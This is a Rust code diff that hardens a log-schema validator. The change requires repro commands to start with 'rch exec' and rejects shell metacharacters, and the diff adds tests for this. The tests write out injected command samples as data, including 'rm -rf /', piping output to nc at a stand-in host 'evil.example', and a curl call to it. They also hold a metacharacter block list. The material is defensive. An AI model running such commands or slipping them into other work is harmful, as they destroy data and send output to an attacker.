@@ -217,11 +217,17 @@ pub struct LogProofReport {
 
 impl E2eLogEntry {
     /// Serialize to JSON string.
+    ///
+    /// br-asupersync-zmzwof: gated to `cfg(test)` because the only callers
+    /// are inside this module's test suite — keeping it `pub` on the prod
+    /// crate surface invites accidental serialization of test-only schemas.
+    #[cfg(test)]
     pub fn to_json(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string(self)
     }
 
     /// Serialize to pretty-printed JSON string.
+    #[cfg(test)]
     pub fn to_json_pretty(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string_pretty(self)
     }
@@ -462,11 +468,15 @@ impl UnitLogEntry {
     }
 
     /// Serialize to JSON string.
+    ///
+    /// br-asupersync-zmzwof: gated to `cfg(test)` (see `E2eLogEntry::to_json`).
+    #[cfg(test)]
     pub fn to_json(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string(self)
     }
 
     /// Serialize to pretty-printed JSON string.
+    #[cfg(test)]
     pub fn to_json_pretty(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string_pretty(self)
     }
@@ -552,11 +562,47 @@ pub fn validate_e2e_log_json(json: &str) -> Vec<String> {
         }
     }
 
-    // Repro command must include rch exec
+    // Repro command must include rch exec, must START with the rch exec
+    // prefix (no shell prologue), and must NOT contain shell metacharacters
+    // that would let an eval-based replay tool be hijacked
+    // (br-asupersync-zmzwof). The schema validator is run on operator-
+    // configured forensic logs, so trust boundary is operator-trustworthy
+    // → defensive shell-meta rejection prevents accidental footguns.
     if let Some(cmd) = value.get("repro_command").and_then(|v| v.as_str()) {
-        if !cmd.trim().is_empty() && !cmd.contains("rch exec --") {
-            violations
-                .push("repro_command must include 'rch exec --' for remote execution".to_string());
+        let trimmed = cmd.trim();
+        if !trimmed.is_empty() {
+            if !trimmed.contains("rch exec --") {
+                violations.push(
+                    "repro_command must include 'rch exec --' for remote execution".to_string(),
+                );
+            }
+            if !(trimmed.starts_with("rch exec --") || trimmed.starts_with("rch exec ")) {
+                violations.push(
+                    "repro_command must START with 'rch exec' (no shell prologue) — \
+                     prefixing other commands enables shell-metacharacter injection if \
+                     a replay tool eval's the command (br-asupersync-zmzwof)"
+                        .to_string(),
+                );
+            }
+            // Reject unquoted shell metacharacters that change command structure.
+            // We allow `--` (the rch arg separator) and `=` and `/` in paths, but
+            // reject sequencing operators, redirection, command substitution,
+            // and process substitution.
+            const SHELL_META: &[char] = &[';', '|', '&', '`', '\n', '\r'];
+            if let Some(bad) = trimmed.chars().find(|c| SHELL_META.contains(c)) {
+                violations.push(format!(
+                    "repro_command contains shell metacharacter {bad:?} — would enable \
+                     shell injection if eval'd by a replay tool (br-asupersync-zmzwof)"
+                ));
+            }
+            // Reject `$(` and `${` (command substitution / parameter expansion).
+            if trimmed.contains("$(") || trimmed.contains("${") {
+                violations.push(
+                    "repro_command contains shell substitution ($( or ${) — \
+                     would enable injection if eval'd (br-asupersync-zmzwof)"
+                        .to_string(),
+                );
+            }
         }
     }
 
@@ -2435,6 +2481,64 @@ mod tests {
                 "should reject whitespace-only {field}: {violations:?}"
             );
         }
+    }
+
+    /// br-asupersync-zmzwof: schema validator must reject repro_command
+    /// strings that contain shell metacharacters or substitutions, or that
+    /// don't START with `rch exec`. Otherwise an eval-based replay tool
+    /// could be hijacked into running attacker-prepended commands.
+    #[test]
+    fn zmzwof_validate_e2e_log_rejects_shell_meta_in_repro_command() {
+        let cases: &[(&str, &str)] = &[
+            ("rm -rf / ; rch exec -- cargo test", "shell metacharacter"),
+            ("rch exec -- cargo test | nc evil.example 4444", "shell metacharacter"),
+            ("rch exec -- cargo test && curl evil.example", "shell metacharacter"),
+            ("rch exec -- cargo test `whoami`", "shell metacharacter"),
+            ("rch exec -- cargo test\nrm -rf /", "shell metacharacter"),
+            ("rch exec -- cargo test $(whoami)", "shell substitution"),
+            ("rch exec -- cargo test ${HOME}/evil", "shell substitution"),
+        ];
+        for (cmd, expected_fragment) in cases {
+            let mut entry = valid_e2e_log_value();
+            entry["repro_command"] = json!(cmd);
+            let violations = validate_e2e_log_json(&entry.to_string());
+            assert!(
+                violations.iter().any(|v| v.contains(expected_fragment)),
+                "should reject shell-meta repro_command {cmd:?}: violations={violations:?}"
+            );
+        }
+    }
+
+    /// br-asupersync-zmzwof: repro_command must START with `rch exec`,
+    /// not just contain it somewhere later in the string.
+    #[test]
+    fn zmzwof_validate_e2e_log_rejects_shell_prologue_before_rch_exec() {
+        let mut entry = valid_e2e_log_value();
+        // Prologue containing only safe-ish chars but the structure is wrong:
+        // a non-rch command followed by rch — would still get rejected because
+        // it doesn't start with `rch exec`.
+        entry["repro_command"] = json!("env FOO=bar rch exec -- cargo test");
+        let violations = validate_e2e_log_json(&entry.to_string());
+        assert!(
+            violations.iter().any(|v| v.contains("must START with 'rch exec'")),
+            "should reject prologue before rch exec: {violations:?}"
+        );
+    }
+
+    /// Positive control: a valid `rch exec --` command with safe chars
+    /// passes the new validator.
+    #[test]
+    fn zmzwof_validate_e2e_log_accepts_normal_rch_exec_command() {
+        let mut entry = valid_e2e_log_value();
+        entry["repro_command"] = json!("rch exec -- cargo test --lib raptorq::test_log_schema");
+        let violations = validate_e2e_log_json(&entry.to_string());
+        // The valid_e2e_log_value() fixture should produce no violations
+        // even after our hardening; if any of our new checks are over-strict
+        // they would surface here.
+        assert!(
+            violations.iter().all(|v| !v.contains("repro_command")),
+            "valid rch exec command must not produce repro_command violations: {violations:?}"
+        );
     }
 
     #[test]
